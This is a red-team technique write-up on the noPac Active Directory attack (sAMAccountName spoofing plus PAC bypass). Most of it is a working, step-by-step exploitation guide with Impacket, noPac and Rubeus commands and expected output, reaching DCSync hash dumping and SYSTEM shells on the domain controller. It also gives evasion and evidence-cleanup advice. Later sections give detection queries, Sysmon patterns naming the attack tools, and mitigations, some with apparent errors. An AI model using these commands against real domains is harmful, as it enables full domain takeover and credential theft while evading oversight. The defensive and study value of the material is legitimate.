# [PE-TOKEN-006]: SamAccountName Spoofing

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-006 |
| **MITRE ATT&CK v18.1** | [T1134.005](https://attack.mitre.org/techniques/T1134/) - Access Token Manipulation: Modifying Account Attributes |
| **Tactic** | Privilege Escalation / Domain Admin Elevation |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2021-42278 (sAMAccountName bypass), CVE-2021-42287 (PAC verification bypass) |
| **Technique Status** | ACTIVE but FIXED (soft patch KB5008102 Nov 2021, enforcement mode required) |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Server 2016, 2019, 2022 (before KB5008102 enforcement); Server 2025 (patched by default) |
| **Patched In** | KB5008102 (soft block Nov 2021) + Enforcement mode (mandatory after grace period) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SamAccountName spoofing (CVE-2021-42278 combined with CVE-2021-42287) is a critical privilege escalation technique that enables an unprivileged domain user to escalate to Domain Administrator privileges without requiring credentials, network access to legitimate administrators, or exploitation of software vulnerabilities. The attack exploits two design flaws in Active Directory's Kerberos implementation: (1) lack of validation for the trailing dollar sign ($) in computer account sAMAccountName attributes, and (2) improper PAC (Privilege Attribute Certificate) verification during inter-realm Kerberos operations. By creating a spoofed computer account named after a domain controller (without the $ suffix), obtaining a Ticket Granting Ticket (TGT) for that spoofed identity, and then requesting a service ticket via S4U2Self (Service for User to Self), an attacker tricks the KDC into issuing a service ticket for a domain administrator account. This technique is known as "noPac" (no Privilege Attribute Certificate validation).

**Attack Surface:** Active Directory Kerberos authentication subsystem, specifically the Key Distribution Center (KDC) running on domain controllers. The attack chain involves: (1) AD computer account creation/modification (LDAP/SAMR), (2) Kerberos TGT/ST requests (port 88), (3) Service Ticket forging via S4U2Self.

**Business Impact:** **Critical – Complete Domain Compromise.** Successful exploitation grants an attacker full domain administrator privileges from a standard user account. This enables: DCSync (domain credential dump), GPO modification, lateral movement to all systems, ransomware deployment, and persistent backdoor creation. The attack is indistinguishable from legitimate administrative activity and leaves minimal forensic evidence if logging is not properly configured.

**Technical Context:** The exploitation is extremely rapid (< 5 minutes) and requires only network connectivity to the KDC (port 88/TCP). Detection is challenging because all actions appear legitimate in AD logs unless specific audit rules are enabled. The technique is fully weaponized with public tools (noPac, Impacket addcomputer/getTGT/getST, Rubeus).

### Operational Risk

- **Execution Risk:** Low – Well-documented attack chain with multiple working PoCs. Requires only standard domain user credentials.
- **Stealth:** High – If audit logging is not enabled for computer account creation (Event 4741/4742) and Kerberos requests (Event 4768/4769), the attack is invisible.
- **Reversibility:** Partially reversible – Deleting the spoofed computer account removes the persistence mechanism, but domain credentials may have already been harvested via DCSync.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.2 (Account Operators) | Restrict user ability to create computer accounts (MachineAccountQuota) |
| **DISA STIG** | V-42403 | Enforce restrictive group membership for privileged operations |
| **CISA SCuBA** | AC-2(1) | Account Creation / Modification Controls |
| **NIST 800-53** | AC-2 | Account Management; AC-3 - Access Control Enforcement |
| **GDPR** | Art. 32 | Technical security of processing; Art. 33 - Breach notification |
| **DORA** | Art. 9 | Protection and Prevention; Art. 18 - Monitoring and logging |
| **NIS2** | Art. 21 | Cybersecurity risk management measures |
| **ISO 27001** | A.9.2.3 | Privileged access rights; A.9.4.1 - Information access restriction |
| **ISO 27005** | Risk Assessment | Unauthorized elevation via identity attacks |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Standard domain user account (ANY domain user).
- **Required Access:** (1) Network access to KDC (port 88/TCP); (2) Access to domain controller(s) for LDAP/SAMR; (3) Knowledge of domain name and at least one domain controller hostname.

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022 (vulnerable without enforcement)
- **Windows:** Server 2025 (patched by default)
- **Prerequisite Checks:**
  - MachineAccountQuota > 0 (default = 10 per user)
  - Kerberos preauthentication enabled (standard)
  - No enforcement of KB5008102 (or within 7-day grace period)

**Dependencies & Tools:**
- [Impacket Suite](https://github.com/fortra/impacket) – (3.0+) Multi-protocol AD exploitation framework
  - `addcomputer.py`: Create/modify computer accounts
  - `addspn.py`: Manage Service Principal Names
  - `renameMachine.py`: Rename computer accounts (change sAMAccountName)
  - `getTGT.py`: Request Kerberos TGT
  - `getST.py`: Request Kerberos Service Ticket with S4U2Self
- [noPac.py](https://github.com/Ridter/noPac) – Automated exploitation tool (full chain)
- [Rubeus](https://github.com/GhostPack/Rubeus) – Windows-based Kerberos manipulation (alternative to Impacket on Windows)
- [PowerShell AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/) – For reconnaissance
- [krb5-user](https://packages.ubuntu.com/focal/krb5-user) – Linux Kerberos utilities (for Impacket)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Check MachineAccountQuota (Attack Prerequisite)

```powershell
# Method 1: PowerShell AD Module
Get-ADDomain | Select-Object @{N='MachineAccountQuota'; E={$_.ms-DS-MachineAccountQuota}}

# Method 2: LDAP Query (if AD module not available)
Get-ADObject -Identity (Get-ADDomain).distinguishedName -Properties "ms-DS-MachineAccountQuota" | Select-Object Name, "ms-DS-MachineAccountQuota"
```

**What to Look For:**
- MachineAccountQuota value > 0 (if 0, unprivileged users cannot create computer accounts; attack fails at Step 1)
- Default value: 10 (allowing each user to create up to 10 computer accounts)

**Expected Output:**
```
ms-DS-MachineAccountQuota
------------------------
                       10
```

#### Enumerate Domain Controllers and Hostname

```powershell
# List all domain controllers
Get-ADDomainController -Filter * | Select-Object Name, HostName, IPv4Address

# Alternative (without AD module):
nltest /dclist:DOMAIN.COM
```

**What to Look For:**
- DC hostname (required for spoofing in Step 3)
- Example: `DC01` or `DC-PROD-01`

#### Check If Enforcement Mode is Enabled (Post-Patch Detection)

```powershell
# Check KB5008102 presence and enforcement
Get-HotFix | Where-Object { $_.HotFixID -match "KB5008102" }

# If patch installed, check if enforcement is active
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v KdcSamAccountNamePrefix
```

**Expected Output (If Vulnerable):**
```
No output or REG_DWORD 0x0 (enforcement NOT active)
```

**Expected Output (If Patched & Enforced):**
```
KdcSamAccountNamePrefix    REG_DWORD    0x1
```

### Linux / Kerberos Reconnaissance

```bash
# Check Kerberos configuration
cat /etc/krb5.conf

# Query domain for MachineAccountQuota (via Impacket)
python3 -m impacket.scripts.lookupsid 'DOMAIN.LOCAL/USERNAME:PASSWORD@DOMAIN_CONTROLLER'

# Check if noPac works (initial scan)
python3 noPac.py 'DOMAIN.LOCAL/USERNAME:PASSWORD' -dc-ip DOMAIN_CONTROLLER --no-add
```

**What to Look For:**
- Kerberos realm defined
- Domain controller reachable
- noPac scanner confirms vulnerability exists

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Impacket (Linux / Cross-Platform)

**Supported Versions:** Server 2016-2022 (pre-KB5008102 or without enforcement)

#### Step 1: Create a Computer Account

**Objective:** Create a new computer account that the attacker will control. This account will be renamed to impersonate a domain controller.

**Command:**
```bash
python3 addcomputer.py -computer-name 'ATTACKER_MACHINE$' -computer-pass 'ComputerPassword123!' 'DOMAIN.LOCAL/USERNAME:PASSWORD@DC_IP'
```

**Parameters Explained:**
- `-computer-name`: Name for the new computer account (will be renamed later)
- `-computer-pass`: Password for the new account (must be set for later S4U2Self requests)
- `DOMAIN.LOCAL/USERNAME:PASSWORD`: Credentials of standard domain user
- `@DC_IP`: IP address of domain controller

**Expected Output:**
```
[*] Requested to create computer: ATTACKER_MACHINE$
[*] User DOMAIN\USERNAME password: Password123!
[*] User Name: ATTACKER_MACHINE$
[*] Computer Name: ATTACKER_MACHINE
[+] Computer account created successfully.
```

**What This Means:**
- Computer account has been added to Active Directory
- Account is controlled by the attacker (created with specified password)
- Default SPNs include: HOST/ATTACKER_MACHINE, RestrictedKrbHost/ATTACKER_MACHINE

**Version Note:** Process identical across Server 2016-2022.

**OpSec & Evasion:**
- Use a descriptive but non-suspicious computer name (e.g., "BACKUP_MACHINE", "WORKSTATION_001")
- Avoid obvious names that trigger SOC alerts
- Consider using a slightly misspelled version of an existing server name (e.g., "EXCH1" instead of "EXCH01") to avoid detection

**Troubleshooting:**
- **Error:** "User DOMAIN\USERNAME failed to authenticate"
  - **Cause:** Credentials incorrect or user lacks computer account creation privileges
  - **Fix:** Verify credentials; check MachineAccountQuota not exhausted
- **Error:** "Computer account already exists"
  - **Cause:** Name already taken (common if testing multiple times)
  - **Fix:** Use a different name or delete existing account first

#### Step 2: Clear servicePrincipalName (SPNs)

**Objective:** Remove SPN entries to allow renaming the account to a domain controller name without conflicts.

**Command:**
```bash
python3 addspn.py --clear -t 'ATTACKER_MACHINE$' -u 'DOMAIN\USERNAME' -p 'PASSWORD' 'DC_HOSTNAME.DOMAIN.LOCAL'
```

**Parameters:**
- `--clear`: Clear all SPNs for the target account
- `-t`: Target account name
- `-u`: Username for authentication
- `-p`: Password
- Final parameter: Domain controller hostname (for connection)

**Expected Output:**
```
[*] Clearing SPNS for: ATTACKER_MACHINE$
[+] SPN removed successfully
```

**What This Means:**
- SPNs have been cleared; the account no longer has HOST/ATTACKER_MACHINE entries
- This prevents conflicts when renaming the account to a DC name (which has its own SPNs)
- SPN update that would normally fail due to existing DC SPNs now succeeds

**OpSec & Evasion:**
- This action is logged as Event 4742 (Computer account modified)
- Ensure audit logs are not monitored in real-time; batch modifications if possible

#### Step 3: Rename Computer Account to Domain Controller Name

**Objective:** Modify the sAMAccountName attribute to match a domain controller's name (WITHOUT the trailing $).

**Command:**
```bash
python3 renameMachine.py -current-name 'ATTACKER_MACHINE$' -new-name 'DC01' 'DOMAIN.LOCAL/USERNAME:PASSWORD@DC_IP'
```

**Parameters:**
- `-current-name`: Current computer account name (with $)
- `-new-name`: Target name (DC name without $, creating the spoofing condition)
- Credentials and DC IP as before

**Expected Output:**
```
[*] Renaming ATTACKER_MACHINE$ to DC01
[+] SamAccountName change: ATTACKER_MACHINE$ -> DC01
```

**What This Means:**
- **CRITICAL:** The sAMAccountName is now "DC01" (should be "DC01$" but is not – this is the CVE-2021-42278 bypass)
- The account is no longer a valid computer account by naming standards, but Windows/AD does not validate this at modification time
- From the KDC's perspective, there is now an account named "DC01" in the directory

**This is the Core Exploit:** No validation prevents a computer account from lacking the trailing $, so it can now impersonate any user account name (including DC accounts).

**Version Note:**
- **Server 2016-2019:** Vulnerability active; no validation
- **Server 2022 (before KB5008102):** Vulnerability active; no validation
- **Server 2022 (with KB5008102 enforcement):** Attempt to create non-compliant name fails; this step will error

**Troubleshooting:**
- **Error:** "Cannot rename to DC01: Account with this name exists"
  - **Cause:** A user account named "DC01" exists (unusual); or validation is enabled
  - **Fix:** Target a different DC name, or check if KB5008102 enforcement is active

#### Step 4: Request Ticket Granting Ticket (TGT) for Spoofed Identity

**Objective:** Obtain a TGT as if the attacker is the DC (using the spoofed "DC01" sAMAccountName).

**Command:**
```bash
python3 getTGT.py -dc-ip 'DC_IP' 'DOMAIN.LOCAL/DC01:ComputerPassword123!'
```

**Parameters:**
- `-dc-ip`: Domain controller IP (where KDC is running)
- `DOMAIN.LOCAL/DC01:ComputerPassword123!`: The spoofed DC account and its password (set in Step 1)

**Expected Output:**
```
[*] Getting TGT for user DC01@DOMAIN.LOCAL
[*] Using DC IP: 10.0.0.1
[+] TGT obtained successfully
[+] Ticket saved to: DC01.ccache
```

**What This Means:**
- The KDC has issued a Ticket Granting Ticket for the account "DC01"
- From the KDC's perspective, this is a normal TGT request (the account name exists in the directory)
- The TGT is stored in a Kerberos credential cache (DC01.ccache)
- The attacker now has a valid TGT that claims identity as DC01

**Key Insight:** This is the normal Kerberos step. The abuse comes next, when using this TGT.

**OpSec & Evasion:**
- Export credential cache to a temp location
- Clean up cache files after exploitation
- Kerberos request is logged as Event 4768 (TGT issued)

#### Step 5: Restore Original sAMAccountName (Critical for S4U2Self Bypass)

**Objective:** Change the sAMAccountName back to the original name. This triggers CVE-2021-42287's PAC verification bypass.

**Command:**
```bash
python3 renameMachine.py -current-name 'DC01' -new-name 'ATTACKER_MACHINE$' 'DOMAIN.LOCAL/USERNAME:PASSWORD@DC_IP'
```

**Expected Output:**
```
[*] Renaming DC01 back to ATTACKER_MACHINE$
[+] SamAccountName change: DC01 -> ATTACKER_MACHINE$
```

**What This Means:**
- The computer account's sAMAccountName is restored to "ATTACKER_MACHINE$"
- The account no longer matches the DC name in the directory
- However, the attacker ALREADY has a TGT for "DC01" in the credential cache
- This TGT is now "orphaned" (the account it claims to represent no longer has that name)
- The next S4U2Self request will trigger the CVE-2021-42287 bug in the KDC

**Technical Detail (The PAC Bypass):**
When the attacker requests a service ticket using the DC01 TGT with S4U2Self:
1. KDC receives request claiming TGT for "DC01"
2. KDC looks for account "DC01" to verify the PAC (Privilege Attribute Certificate) signature
3. KDC does NOT find "DC01" in the directory (it was renamed back to ATTACKER_MACHINE$)
4. **BUG:** Instead of rejecting the request, the KDC searches for "DC01$" (adds trailing $)
5. KDC finds the domain controller machine account "DC01$"
6. KDC verifies the PAC as if it's for the DC (which has admin privileges)
7. KDC issues a service ticket for the requested user (Administrator) on behalf of the DC

#### Step 6: Request Service Ticket with S4U2Self Impersonation (The Escalation)

**Objective:** Use the TGT from Step 4 (paired with the renamed account from Step 5) to request a service ticket impersonating a domain administrator.

**Command:**
```bash
export KRB5CCNAME=DC01.ccache

python3 getST.py -self -impersonate 'Administrator' -altservice 'cifs/DC01.DOMAIN.LOCAL' \
  -k -no-pass -dc-ip 'DC_IP' 'DOMAIN.LOCAL/DC01'
```

**Parameters:**
- `export KRB5CCNAME=DC01.ccache`: Use the TGT obtained in Step 4
- `-self`: Request S4U2Self (service ticket for the TGT owner)
- `-impersonate`: Request on behalf of this user (Administrator)
- `-altservice`: Alternative service SPN to request (cifs/DC01 for file access)
- `-k`: Use Kerberos authentication
- `-no-pass`: No password needed (using cached TGT)
- `DOMAIN.LOCAL/DC01`: The spoofed identity (must match TGT)

**Expected Output:**
```
[*] Requesting service ticket for DC01 (impersonating Administrator)
[*] Using TGT from: DC01.ccache
[+] Service ticket obtained
[+] Ticket saved to: Administrator@cifs-DC01.DOMAIN.LOCAL.ccache
```

**What This Means:**
- **EXPLOITATION SUCCESSFUL:** The attacker now has a service ticket for the Administrator account
- The ticket claims to be on behalf of the Domain Controller (DC01)
- The ticket is valid for accessing CIFS (file sharing) or other services on the DC
- This ticket grants administrative privileges on the domain controller

**The CVE Chain Summary:**
- **CVE-2021-42278:** Allowed spoofing (account without $ suffix created)
- **CVE-2021-42287:** PAC verification flaw allowed KDC to issue admin ticket for spoofed account

#### Step 7: Use Service Ticket for Lateral Movement or Credential Harvesting

**Objective:** Exploit the obtained service ticket to access domain controller and escalate to full domain compromise.

**Option A: DCSync (Dump Domain Credentials)**

```bash
export KRB5CCNAME=Administrator@cifs-DC01.DOMAIN.LOCAL.ccache

python3 secretsdump.py -k -no-pass 'DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL'
```

**Expected Output:**
```
[*] DCSync attack successful
[*] Dumping domain credentials:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a80b923ef00ac41b471e1f0c6b1fa03:::
... (all domain credentials)
```

**What This Means:**
- All domain user password hashes have been extracted
- Attacker can now crack hashes offline or use Pass-the-Hash attacks
- Domain is fully compromised

**Option B: PSExec Remote Code Execution**

```bash
export KRB5CCNAME=Administrator@cifs-DC01.DOMAIN.LOCAL.ccache

python3 psexec.py -k -no-pass 'DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL' cmd.exe
```

**Expected Output:**
```
Type the output of the 'ipconfig' command and press return:
C:\> whoami
NT AUTHORITY\SYSTEM

C:\> hostname
DC01
```

**What This Means:**
- Attacker has remote code execution as SYSTEM on the domain controller
- Full domain compromise achieved

**OpSec & Evasion:**
- Export cache files to /tmp and clean up after exploitation
- Avoid leaving temporary files
- Use clean exit (Ctrl+C) to close sessions gracefully
- If possible, delete the spoofed computer account after exploitation to remove evidence

---

### METHOD 2: Using noPac Automated Tool (Linux)

**Supported Versions:** Server 2016-2022 (pre-KB5008102 or without enforcement)

#### Step 1: Full Exploitation Chain with noPac

**Objective:** Execute the complete attack chain (Steps 1-7) in a single command.

**Command (Scan Only):**
```bash
python3 noPac.py 'DOMAIN.LOCAL/USERNAME:PASSWORD' -dc-ip 'DC_IP' -dc-host 'DC_HOSTNAME' --no-add
```

**Expected Output:**
```
[*] Checking if noPac is vulnerable...
[+] DOMAIN.LOCAL is vulnerable to noPac
```

**Command (Full Exploitation - Create Account, Exploit, and Dump):**
```bash
python3 noPac.py 'DOMAIN.LOCAL/USERNAME:PASSWORD' -dc-ip 'DC_IP' -dc-host 'DC_HOSTNAME' \
  --impersonate 'Administrator' -dump
```

**Expected Output:**
```
[*] Creating computer account...
[+] Computer account created
[*] Requesting TGT...
[+] TGT obtained
[*] Requesting service ticket...
[+] Service ticket obtained
[*] Performing DCSync...
[+] Domain credentials dumped
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a80b923ef00ac41b471e1f0c6b1fa03:::
```

**What This Means:**
- noPac has automated the entire attack chain
- Domain admin credentials have been obtained
- Attacker now controls the domain

**Cleanup (Important for Stealth):**
```bash
python3 noPac.py 'DOMAIN.LOCAL/USERNAME:PASSWORD' -dc-ip 'DC_IP' -dc-host 'DC_HOSTNAME' --cleanup
```

**This removes:** Spoofed computer account, clearing evidence of the attack.

### METHOD 3: Using Rubeus (Windows-Based)

**Supported Versions:** Server 2016-2022 (pre-KB5008102 or without enforcement)

**Note:** Rubeus is Windows-native; can be executed after obtaining initial access on a domain-joined Windows system.

#### Step 1: Create and Exploit with Rubeus

**Command (Create Computer Account):**
```powershell
.\Rubeus.exe computer /add /name:ATTACKER_MACHINE /samaccountname:DC01 /password:ComputerPassword123!
```

#### Step 2: Request TGT

```powershell
.\Rubeus.exe asktgt /user:DC01 /password:ComputerPassword123! /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /outfile:tgt.kirbi
```

#### Step 3: Request Service Ticket with S4U2Self

```powershell
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:Administrator /mspn:cifs/DC01.DOMAIN.LOCAL /ptt
```

**Expected Output:**
```
[+] Ticket is now in use by the current logon session!
```

---

## 5. TOOLS & COMMANDS REFERENCE

### Impacket Suite

**URL:** [Fortra Impacket GitHub](https://github.com/fortra/impacket)

**Version:** 0.10.x+ (current)

**Installation:**
```bash
pip3 install impacket
# Or clone and install:
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

**Key Scripts for noPac:**
- `addcomputer.py`: Create computer account
- `renameMachine.py`: Rename computer account (change sAMAccountName)
- `getTGT.py`: Request Kerberos TGT
- `getST.py`: Request service ticket with S4U2Self
- `secretsdump.py`: Extract credentials via DCSync

### noPac Exploitation Framework

**URL:** [GitHub - Ridter/noPac](https://github.com/Ridter/noPac)

**Version:** Latest (actively maintained)

**Installation:**
```bash
git clone https://github.com/Ridter/noPac.git
cd noPac
pip3 install -r requirements.txt
```

**Usage:**
```bash
# Vulnerability scan
python3 noPac.py 'DOMAIN/USERNAME:PASSWORD' -dc-ip DC_IP --no-add

# Full exploitation with credential dump
python3 noPac.py 'DOMAIN/USERNAME:PASSWORD' -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate Administrator -dump

# Cleanup spoofed account
python3 noPac.py 'DOMAIN/USERNAME:PASSWORD' -dc-ip DC_IP --cleanup
```

### Rubeus (Windows)

**URL:** [GhostPack/Rubeus GitHub](https://github.com/GhostPack/Rubeus)

**Version:** Latest compiled release

**Installation:**
```bash
# Download pre-compiled or compile from source:
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
# Compile in Visual Studio (release mode) or download pre-compiled exe
```

**Usage:**
```powershell
.\Rubeus.exe computer /add /name:ATTACKERMACHINE /samaccountname:DC01 /password:P@ss123
.\Rubeus.exe asktgt /user:DC01 /password:P@ss123 /domain:domain.local /dc:dc01
.\Rubeus.exe s4u /impersonateuser:Administrator /mspn:cifs/dc01 /ticket:tgt.kirbi /ptt
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Computer Account Creation by Non-Admin User

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Category
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To:** Entra ID (if directory sync) or Windows AD via Defender for Identity

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to group" or OperationName =~ "Create.*computer"
| where TimeGenerated > ago(1h)
| project TimeGenerated, OperationName, InitiatedBy=tostring(InitiatedBy.user.userPrincipalName), TargetResources
| join (
    SigninLogs
    | where CreatedDateTime > ago(1h)
    | where UserPrincipalName !in ("admin@contoso.com", "svc_*@contoso.com")  // Whitelist admins
    | project UserPrincipalName, IPAddress
) on $left.InitiatedBy == $right.UserPrincipalName
| extend IsHighRiskIP = (IPAddress !in ("10.0.0.0/8", "172.16.0.0/12"))  // External IPs = high risk
| where IsHighRiskIP
```

**What This Detects:**
- Non-administrative users creating computer accounts
- Correlation with suspicious sign-in locations
- Deviation from normal administrative patterns

**Manual Configuration Steps (Microsoft Sentinel):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Computer Account Creation`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group events by: `InitiatedBy`
7. Click **Review + create**

#### Query 2: Suspicious sAMAccountName Change (Non-Compliant Computer Accounts)

**KQL Query:**
```kusto
let suspicious_names = dynamic(['DC', 'DC01', 'DC02', 'EXCH', 'SQL', 'FS']);
AuditLogs
| where OperationName =~ "Update computer"
| where TargetResources has "samaccountname"
| extend OldName = extract(@"OldValue:\s*(\S+)", 1, tostring(TargetResources[0].modifiedProperties[0].oldValue))
| extend NewName = extract(@"NewValue:\s*(\S+)", 1, tostring(TargetResources[0].modifiedProperties[0].newValue))
| where not(NewName endswith "$")  // Computer accounts should END with $
| where NewName in (suspicious_names) or NewName matches regex @"DC\d{2}$|EXCH\d+$|SQL\d+$"
| project TimeGenerated, InitiatedBy=tostring(InitiatedBy.user.userPrincipalName), OldName, NewName, TargetResources
```

**What This Detects:**
- Computer account sAMAccountName changed to lack trailing $
- Names matching domain controller, Exchange, or SQL patterns
- CVE-2021-42278 exploitation indicators

**Manual Configuration Steps:**
Same as Query 1, paste this query into the rule logic.

#### Query 3: Kerberos S4U2Self Request from Unexpected Account

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769  // Kerberos service ticket requested
| where TicketOptions contains "forwarded"  // S4U2Self has forwarded flag
| where ServiceName matches regex @"^cifs|ldap|krbtgt"  // Common targets
| extend ClientName = tostring(split(ClientAddress, ':')[0])
| where ClientName !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  // External = suspicious
```

**What This Detects:**
- Unusual Kerberos service ticket requests
- S4U2Self operations from external IPs or unexpected accounts

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4741 (Computer account created)**
- **Log Source:** Security
- **Trigger:** When a new computer account is created in AD
- **Filter:** Monitor for accounts created by non-administrative users; correlate with 4768 (TGT requests) for the same account name

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
3. Enable: **Audit Computer Account Management**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target domain controllers

**Event ID: 4742 (Computer account modified)**
- **Log Source:** Security
- **Trigger:** When any properties of a computer account change (especially sAMAccountName)
- **Filter:** Look for changes to sAMAccountName that remove or alter the trailing $; look for SPN clearing

**Manual Configuration Steps:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
3. Enable: **Audit Computer Account Management**
4. Set to: **Success and Failure**
5. Enable SACL auditing on the Computers OU:
   ```cmd
   dsacls "CN=Computers,DC=domain,DC=local" /G "Everyone:CCRC;computer"
   ```

**Event ID: 4768 (Kerberos TGT issued)**
- **Log Source:** Security (requires Kerberos audit enabled)
- **Trigger:** When KDC issues a TGT to any user/computer
- **Filter:** Look for TGT requests for computer accounts with unusual names (e.g., DC names without $)

**Event ID: 4769 (Kerberos service ticket requested)**
- **Log Source:** Security
- **Trigger:** When KDC issues a service ticket
- **Filter:** Look for S4U2Self requests (TicketOptions contains "forwardable" or "forwarded"); look for unexpected impersonation (service tickets for admin users from non-admin accounts)

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.20">
  <EventFiltering>
    <!-- Detect Impacket/noPac tools (often named with specific patterns) -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">getTGT</CommandLine>
    </ProcessCreate>
    
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">getST.py</CommandLine>
    </ProcessCreate>
    
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">renameMachine</CommandLine>
    </ProcessCreate>
    
    <!-- Detect Rubeus execution -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">Rubeus.exe</Image>
    </ProcessCreate>
    
    <!-- Detect unusual PowerShell AD modifications -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Set-ADComputer</CommandLine>
      <CommandLine condition="contains">samaccountname</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with XML above
3. Install:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. View logs:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[(EventID=1)]]" -MaxEvents 10
   ```

---

## 9. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Install and Enforce KB5008102 (Mandatory):** This patch blocks sAMAccountName spoofing by enforcing the trailing $ requirement.
    **Applies To Versions:** Server 2016, 2019, 2022
    
    **Manual Steps (Patch Installation):**
    1. Download KB5008102 from [Microsoft Update Catalog](https://www.catalog.update.microsoft.com)
    2. Install on all domain controllers:
       ```cmd
       wusa.exe KB5008102-x64.msu /quiet /norestart
       ```
    3. Restart domain controllers (after-hours recommended)
    
    **Manual Steps (Enable Enforcement Mode):**
    1. After patching all DCs, enable enforcement:
       ```cmd
       reg add "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v KdcSamAccountNamePrefix /t REG_DWORD /d 1 /f
       ```
    2. Restart the KDC service:
       ```cmd
       net stop kdc
       net start kdc
       ```
    3. Verify enforcement:
       ```cmd
       reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v KdcSamAccountNamePrefix
       # Should show: 0x1 (enabled)
       ```

*   **Restrict MachineAccountQuota:** Limit the number of computer accounts unprivileged users can create.
    **Applies To Versions:** All versions (via AD configuration)
    
    **Manual Steps (Set MachineAccountQuota to 0):**
    1. Open **Active Directory Users and Computers** → Right-click domain → **Properties**
    2. Go to **Group Policy** tab (or use gpmc.msc)
    3. Create/Edit a Group Policy Object (GPO) that applies to domain controllers
    4. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
    5. Locate: **Increase a process working set** (or set via PowerShell below)
    
    **Manual Steps (PowerShell – Set MachineAccountQuota):**
    ```powershell
    # Query current quota
    Get-ADDomain | Select-Object @{N='MachineAccountQuota'; E={$_.ms-DS-MachineAccountQuota}}
    
    # Set quota to 0 (disable unprivileged account creation)
    Set-ADDomain -Identity (Get-ADDomain).DistinguishedName -Replace @{"ms-DS-MachineAccountQuota" = 0}
    
    # Verify
    Get-ADDomain | Select-Object @{N='MachineAccountQuota'; E={$_.ms-DS-MachineAccountQuota}}
    ```

*   **Enable Comprehensive Audit Logging (Event 4741, 4742, 4768, 4769):** Ensure all AD modifications and Kerberos requests are logged.
    
    **Manual Steps:**
    1. Apply Group Policy for computer account and Kerberos auditing (see Section 7)
    2. Ensure Event Log is retained (not cleared):
       ```cmd
       wevtutil set-log Security /retention:true /maxsize:1000000000
       ```
    3. Enable real-time monitoring of these events (via SIEM or endpoint agent)

*   **Deploy Threat Detection for Behavioral Indicators:** Monitor for the attack chain in real-time.
    
    **Manual Steps (Microsoft Sentinel):**
    1. Refer to Section 6 for KQL queries
    2. Create detection rules for:
       - Computer account creation by non-admins
       - sAMAccountName changes (removal of $)
       - Suspicious S4U2Self requests

#### Priority 2: HIGH

*   **Restrict Computer Account Creation:** Limit who can create computer accounts via ACL (Access Control List) modifications.
    
    **Manual Steps (Restrict Computers OU):**
    1. Open **Active Directory Users and Computers** → Navigate to **Computers** OU
    2. Right-click → **Properties** → **Security** tab → **Advanced**
    3. Click **Change Permissions** → **Edit**
    4. Select **Authenticated Users** → Uncheck **"Create computerobject"**
    5. Click **OK** → **Apply**

